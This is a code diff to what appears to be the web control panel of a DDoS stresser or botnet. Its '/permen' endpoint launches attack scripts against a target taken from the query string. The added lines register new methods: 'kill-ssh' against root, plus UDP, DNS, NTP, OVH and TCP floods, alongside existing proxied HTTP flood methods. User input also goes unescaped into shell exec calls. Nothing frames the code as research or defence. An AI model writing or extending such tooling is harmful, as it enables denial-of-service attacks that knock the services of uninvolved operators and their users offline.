@@ -32,6 +32,8 @@ app.get('/permen', (req, res) => {
     exec(`node methods/Pluto.js ${target} ${time} 65 4 proxy.txt`);
   } else if (methods === 'poseidon') {
     exec(`node methods/Poseidon.js ${target} ${time} 4 proxy.txt autorate`);
+  } else if (methods === 'httpv4') {
+    exec(`node methods/httpv44.js ${target} ${time} 65 4 proxy.txt`);
   } else if (methods === 'nuke') {
     exec(`node methods/Nuke.js ${target} ${time} 65 4 proxy.txt`);
   } else if (methods === 'pidoras') {
@@ -72,6 +74,18 @@ app.get('/permen', (req, res) => {
     exec(`node methods/YAT-TLS.js ${target} ${time} 65 4 proxy.txt`);
   } else if (methods === 'tcp') {
     exec(`./methods/tcp ${slurp} ${port} ${time}`);
+  } else if (methods === 'kill-ssh') {
+    exec(`node methods/StarsXSSH.js ${slurp} ${port} root ${time}`);
+  } else if (methods === 'udp') {
+    exec(`node methods/udp.js ${slurp} ${port} ${time}`);
+  } else if (methods === 'dns') {
+    exec(`node methods/dns.js ${slurp} ${port} ${time}`);
+  } else if (methods === 'ntp') {
+    exec(`node methods/ntp.js ${slurp} ${port} ${time}`);
+  } else if (methods === 'ovh') {
+    exec(`node methods/ovh.js ${slurp} ${port} ${time}`);
+  } else if (methods === 'tcp2') {
+    exec(`node methods/tcp.js ${slurp} ${port} ${time}`);
   } else if (methods === 'refresh') {
     exec(`pm2 restart all && pkill node`);
   } else if (methods === 'proxy') {
